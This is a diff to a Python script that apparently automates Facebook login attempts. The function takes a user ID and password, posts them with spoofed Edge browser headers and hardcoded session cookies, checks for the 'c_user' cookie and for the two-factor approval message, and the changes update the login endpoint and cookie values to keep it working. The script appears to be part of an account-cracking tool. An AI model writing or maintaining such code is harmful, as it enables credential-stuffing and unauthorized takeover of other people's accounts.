@@ -1519,10 +1519,8 @@ def mobile(uid,pwx,tl):
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'cred_type': '100',
-            'login_source': 'device_based_login_add_account',
+            'login_source': 'comet_headerless_login',
             'next': '',
-            'persistent': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'ps_n': '1',
@@ -1530,8 +1528,8 @@ def mobile(uid,pwx,tl):
             'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
             'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
             'locale': 'en_GB',
-            'wd': '1440x828',
-            'fr': '1rNHx4L9yZvgxejws.AWWtERimK3UyO1sORWleZGEqRL4.BnXFu6..AAA.0.0.BnYFKs.AWW3z07_jB4',}
+            'fr': '1rNHx4L9yZvgxejws.AWWeFfLTFfHYf5RSIfxYf4wpBrI.BnXFu6..AAA.0.0.Bnbv_s.AWXHyuW8kiA',
+            'wd': '1440x828',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
@@ -1544,7 +1542,7 @@ def mobile(uid,pwx,tl):
             'referer': 'https://www.facebook.com/?ref=homescreenpwa',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
+            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
@@ -1557,7 +1555,7 @@ def mobile(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
             'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/'
+            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MzI3NzI0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
             po = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
